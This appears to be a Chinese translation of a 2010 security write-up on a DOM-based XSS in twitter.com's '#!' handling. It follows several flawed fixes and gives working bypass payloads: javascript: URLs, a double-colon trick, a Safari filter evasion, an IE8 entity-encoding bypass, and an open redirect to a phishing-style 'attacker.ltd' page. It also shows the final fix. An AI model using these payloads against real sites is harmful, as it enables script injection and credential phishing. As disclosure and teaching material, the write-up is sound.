---
title: A Twitter DomXss, a wrong fix and something more
date: 
tags:
- 老文翻译
- domxss
- twitter
comments: true
categories: 老文翻译
---

## 一个推特的DOMXSS，它的一个错误的修复和一些其他的东西
*一个推特的DOM XSS*

推特的新站点似乎引入了一些问题，这些问题导致了可以被蠕虫利用的存储XSS。
他们也在页面中加入了一些新的JAVASCRIPT,我在html中搜索蠕虫的有效荷载时顺便发现了它们.  
代码如下： 

{% codeblock lang:javascript %}
//<![CDATA[
(function(g){var a=location.href.split("#!")[1];if(a){g.location=g.HBR=a;}})(window);
//]]>
{% endcodeblock %} 
   
<!-- more -->
   
*你发现问题出现在哪了吗？*

这行代码会在url中搜索"#!"，并将它之后的内容分配给window.location对象。这个问题现在存在twitter.com主站上（几乎？）每个页面上。
根据DOM xss wiki，location对象是被标记为危险的第一批对象之一，因为它既是source又是sink
事实上DOM BASED XSS会被这种简单的方式触发：   

```
http://twitter.com/#!javascript:alert(document.domain);   
```


就像下面截图中展示的那样
![TwitterXss1](TwitterXss1.jpg) 
非常简单并有效
在发现这个漏洞后，我给推特发了一封邮件去警告这个问题，但是它们并没有为蠕虫的传播而道歉
这种反应真的非常好笑，因为他们不能在存在antixss过滤器的safari浏览器上复现这个漏洞，即使这个漏洞非常的直接了当。
很明显我在所有的浏览器上检测了这个漏洞，但是safari，你们猜猜？
safari阻拦了这个漏洞！我们稍后再谈谈这个。
我告诉他们这个漏洞在 Firefox, Chrome 和Opera上可以触发之后，他们非常感谢我，并确认了这个漏洞的存在。之后就再也没有消息了。

*一个错误的修复（不如不替换）*
*Thanks Gaz for the title.*
在几个小时后，我发现了这个漏洞的修复
{% codeblock lang:javascript %}
var c = location.href.split("#!")[1];
if (c) {
    window.location = c.replace(":", "");
} else {
    return true;
}
{% endcodeblock %} 

*它有什么问题？*
1. 数据验证：'c'没有按照指示进行验证，那就意味着可以使用除了":"以外的任何字符。数据验证就是将每个可能输入集合限制为预期的子集。问题在于我们需要去只限制这一个字符吗？
2. 黑名单：众所周知，如果黑名单限制不够严格，就会导致绕过。
3. 没有对输出进行编码：由于位置分配调用了URL解析器，因此上下文是众所周知的，并且具有其自己的元字符和结构。URLParser上下文中的编码也称为URLEncoding。
4. 使用的替换：让我们看看文档（ECMA 规范）：

{% codeblock lang:javascript %}
[...]
String.prototype.replace (searchValue, replaceValue)
[...]
如果searchValue不是正则表达式，就会将searchString为ToString(searchValue)，并搜索首次出现searchString的字符串，同时令m为0.
[...]
{% endcodeblock %}

以上分析说明这是个错误的修复，事实上可以用两个':'来进行绕过  
{% codeblock %}
http://twitter.com/#!javascript::alert(document.domain);
{% endcodeblock %}
看看这'::'?  
这里的替换只删除了第一个':'，只要我们使用两个':'就可以绕过替换了  
还有一个缺点是绕过了包括safari在内的几个客户端过滤器  

所以我再次给推特写信：  
>嗨，那个修复不对！    
>{% codeblock lang:javascript %}
(function(g){var  
a=location.href.split("#!")[1];if(a){g.location=g.HBR=a.replace(":","");}})(window);{% endcodeblock %}
>这种修复无法抵御以下攻击:   
>{% codeblock %}
twitter.com/#!javascript::alert(1)  
{% endcodeblock %}
>看见那两个':'了吗？  
>我建议您对其进行urlencode  
>如果出现问题，请设置允许字符的白名单在将字符分配到loaction之前  
>另一个可行的修复：  
>location.pathname=a  
>或
>location.search=a
>这种修复让用户保持在相同的domain中（不确定它是否能在所有的浏览器上工作），但是我不知道这对于推特来说是否是可行的。  
>这并不是一个简单的任务，像往常一样 :) 
>...  
>并且请在这个修复起效后给我发邮件，因为我并不想去时不时检查漏洞有没有修复。  


今早我发现了如下的修复（没收到邮件）：
{% codeblock lang:javascript %}
(function(g){  
var a=location.href.split("#!")[1];  
if(a){  
g.location=g.HBR=a.replace(":","","g");  
}  
})(window);  
{% endcodeblock %}

这种修复解决了多":"的攻击，但是，恕我直言，这并没有真正的解决我先前说明的问题。  

*safari过滤器的突破（更重要的部分）*  

作为twitter dom xss的附带结果，我发现自己正在使用Safari anti Xss 过滤器存在一些问题。  
似乎它会尝试会在分配给laction的有效荷载与浏览器位置栏中的url中的值之间寻找匹配项。  
在经过一系列测试后了解了过滤器的行为，我发现它会对网址进行url编码，然后进行模式搜索  
问题就是因此产生的。  
事实上，由于"+"被替换为空字符：  
{% codeblock lang:javascript %}
twitter.com?#!javascript:1+alert(1)
{% endcodeblock %}   
变成了：  
{% codeblock lang:javascript %}
twitter.com?#!javascript:1 alert(1)
{% endcodeblock %}   
显然过滤器不会匹配：  
{% codeblock lang:javascript %}
"javascript:1+alert(1)" 
{% endcodeblock %}    
然后你就进行了过滤器的突破。  

Update (24/09/2010)  
twitter最终为第二个错误的修复设置了一个可行的补丁（看看注释）。  
{% codeblock lang:javascript %}
(function(g){var a=location.href.split("#!")[1];  
if(a){g.location=g.HBR=a.replace(/:/gi,"");}})(window);  
{% endcodeblock %} 
虽然它不是最好的，有一说一，它还是有用的….唔，直到它被突破。  
这个补丁仅仅修复了':'带来的问题，仍然遗留了一个可以进行任意重定向的漏洞  
{% codeblock %}
twitter.com#!//attacker.ltd/with/a/page/similar/to/twitterlogin/page  
{% endcodeblock %} 

Update (25/09/2010)

不出所料，有一个基于IE8的绕过（已公开）（约占26%的市场份额）  
我发现它在昨天被Gareth Heyes和usuke Hasegawa独立找到的，并报告给了twitter安全小组  
这个绕过利用了html中':'的实体符号代码 ```&#58;``` 或 ```&#x3a; ```   
IE8并不像其他浏览器一样，它会把找到的实体在分配给location对象后转换为原始值。  
```location="&x#58;"  ```
这将使浏览器转到':'而不是字面意义上的"```&x58;```"  
所以，当补丁尝试去替换':'为空时，它将不能识别到冒号。  
但是对loacation的分配会将其再次转换为冒号。  
```twitter.com#!javascript&x58;alert(1) ``` 
这种攻击代码仍然有效（它不在黑名单里面）  
最后，在写了一篇新的邮件给twitter安全小组后，他们使用了一个很好的防御性补丁：  
{% codeblock %}
(function(g){var a=location.href.split("#!")[1];if(a){window.location.  hash = "";g.location.pathname = g.HBR = a;}})(window);  
{% endcodeblock %} 

就像我在我的第一篇邮件里建议的那样。  
这个方案让分配在正确的属性（路径名）上执行  
因此可以在正确的上下文中对其进行解析，不会产生暴力绕过新的URI方案的情况。  
现在，一切*应该*一切都很好...好吧，如果所有浏览器的行为都正确！  